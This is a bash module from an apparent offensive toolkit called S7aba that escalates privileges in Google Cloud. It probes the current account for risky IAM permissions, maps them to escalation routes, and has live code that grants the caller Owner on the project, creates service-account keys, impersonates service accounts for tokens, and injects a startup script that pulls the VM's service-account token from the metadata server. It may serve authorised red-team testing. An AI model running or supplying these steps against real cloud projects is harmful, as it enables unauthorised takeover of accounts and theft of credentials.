#!/usr/bin/env bash
# S7aba - GCP Privilege Escalation Module

declare -a ESCALATION_PATHS=()

analyze_permissions() {
    log_info "Analyzing GCP permissions for escalation vectors..."

    local project
    project=$(gcloud config get-value project 2>/dev/null)
    local account
    account=$(gcloud config get-value account 2>/dev/null)

    # Test dangerous permissions
    local dangerous_perms=(
        "iam.roles.update"
        "iam.serviceAccounts.getAccessToken"
        "iam.serviceAccounts.implicitDelegation"
        "iam.serviceAccounts.signBlob"
        "iam.serviceAccounts.signJwt"
        "iam.serviceAccountKeys.create"
        "iam.serviceAccounts.actAs"
        "resourcemanager.projects.setIamPolicy"
        "deploymentmanager.deployments.create"
        "compute.instances.create"
        "compute.instances.setMetadata"
        "cloudfunctions.functions.create"
        "cloudfunctions.functions.update"
        "run.services.create"
        "cloudbuild.builds.create"
        "composer.environments.create"
        "dataflow.jobs.create"
        "dataproc.clusters.create"
        "orgpolicy.policy.set"
    )

    for perm in "${dangerous_perms[@]}"; do
        local result
        result=$(gcloud projects test-iam-permissions "$project" --permissions="$perm" \
            --format='value(permissions)' 2>/dev/null)
        if [[ -n "$result" ]]; then
            log_debug "Has permission: $perm"
            ESCALATION_PATHS+=("$perm")
        fi
    done
}

find_escalation_paths() {
    local paths=""

    # setIamPolicy - give yourself owner
    if [[ " ${ESCALATION_PATHS[*]} " =~ "resourcemanager.projects.setIamPolicy" ]]; then
        paths+="CRITICAL|SetIamPolicy|Modify project IAM policy to grant yourself Owner role\n"
    fi

    # SA key creation
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccountKeys.create" ]]; then
        paths+="HIGH|CreateSAKey|Generate key for privileged service account\n"
    fi

    # SA token generation
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccounts.getAccessToken" ]]; then
        paths+="HIGH|GetSAToken|Generate access token for privileged service account\n"
    fi

    # SA impersonation via signBlob/signJwt
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccounts.signBlob" ]] || \
       [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccounts.signJwt" ]]; then
        paths+="HIGH|SignBlobJwt|Sign blobs/JWTs as service account for token generation\n"
    fi

    # actAs + compute = VM with privileged SA
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccounts.actAs" ]] && \
       [[ " ${ESCALATION_PATHS[*]} " =~ "compute.instances.create" ]]; then
        paths+="HIGH|ActAs+Compute|Create VM with privileged service account attached\n"
    fi

    # actAs + cloud functions
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccounts.actAs" ]] && \
       [[ " ${ESCALATION_PATHS[*]} " =~ "cloudfunctions.functions.create" ]]; then
        paths+="HIGH|ActAs+CloudFunction|Deploy Cloud Function with privileged SA\n"
    fi

    # actAs + cloud run
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.serviceAccounts.actAs" ]] && \
       [[ " ${ESCALATION_PATHS[*]} " =~ "run.services.create" ]]; then
        paths+="HIGH|ActAs+CloudRun|Deploy Cloud Run service with privileged SA\n"
    fi

    # Compute instance metadata injection
    if [[ " ${ESCALATION_PATHS[*]} " =~ "compute.instances.setMetadata" ]]; then
        paths+="HIGH|SetMetadata|Inject startup script into existing VM via metadata\n"
    fi

    # Cloud Build
    if [[ " ${ESCALATION_PATHS[*]} " =~ "cloudbuild.builds.create" ]]; then
        paths+="HIGH|CloudBuild|Submit build using Cloud Build SA (often has broad perms)\n"
    fi

    # Custom role update
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam.roles.update" ]]; then
        paths+="HIGH|UpdateRole|Add permissions to existing custom role assigned to self\n"
    fi

    # Deployment Manager
    if [[ " ${ESCALATION_PATHS[*]} " =~ "deploymentmanager.deployments.create" ]]; then
        paths+="HIGH|DeploymentManager|Create deployment with DM SA to access resources\n"
    fi

    # Org policy override
    if [[ " ${ESCALATION_PATHS[*]} " =~ "orgpolicy.policy.set" ]]; then
        paths+="CRITICAL|OrgPolicyOverride|Override organization security policies\n"
    fi

    echo -e "$paths"
}

exploit_paths() {
    local paths="$1"
    log_warn "Select escalation path to attempt:"

    echo "$paths" | while IFS='|' read -r risk method description; do
        [[ -z "$method" ]] && continue
        echo -e "  ${YELLOW}→${RESET} ${method}"
    done

    echo ""
    read -rp "$(echo -e "${YELLOW}[?] Enter method name: ${RESET}")" selected

    local project
    project=$(gcloud config get-value project 2>/dev/null)

    case "$selected" in
        "SetIamPolicy")
            log_warn "Attempting project IAM policy modification..."
            local account
            account=$(gcloud config get-value account 2>/dev/null)
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would add $account as Owner on $project"
            else
                gcloud projects add-iam-policy-binding "$project" \
                    --member="user:$account" --role="roles/owner" 2>/dev/null
                log_success "Owner role granted to $account"
            fi
            ;;
        "CreateSAKey")
            log_warn "Listing privileged service accounts..."
            gcloud iam service-accounts list --format='table(email,displayName)' 2>/dev/null
            read -rp "$(echo -e "${YELLOW}[?] Target SA email: ${RESET}")" sa_email
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create key for $sa_email"
            else
                gcloud iam service-accounts keys create /tmp/s7aba_sa_key.json \
                    --iam-account="$sa_email" 2>/dev/null
                log_success "Key saved to /tmp/s7aba_sa_key.json"
            fi
            ;;
        "GetSAToken")
            log_warn "Generating SA access token..."
            gcloud iam service-accounts list --format='table(email)' 2>/dev/null
            read -rp "$(echo -e "${YELLOW}[?] Target SA email: ${RESET}")" sa_email
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would generate token for $sa_email"
            else
                local token
                token=$(gcloud auth print-access-token --impersonate-service-account="$sa_email" 2>/dev/null)
                [[ -n "$token" ]] && log_success "Access token obtained for $sa_email"
            fi
            ;;
        "SetMetadata")
            log_warn "Listing compute instances..."
            gcloud compute instances list --format='table(name,zone)' 2>/dev/null
            read -rp "$(echo -e "${YELLOW}[?] Target instance (name): ${RESET}")" inst
            read -rp "$(echo -e "${YELLOW}[?] Zone: ${RESET}")" zone
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would inject startup script into $inst"
            else
                gcloud compute instances add-metadata "$inst" --zone="$zone" \
                    --metadata=startup-script='#!/bin/bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token > /tmp/token.json' 2>/dev/null
                log_success "Startup script injected into $inst"
            fi
            ;;
        *)
            log_warn "Method '$selected' — manual exploitation required"
            ;;
    esac
}
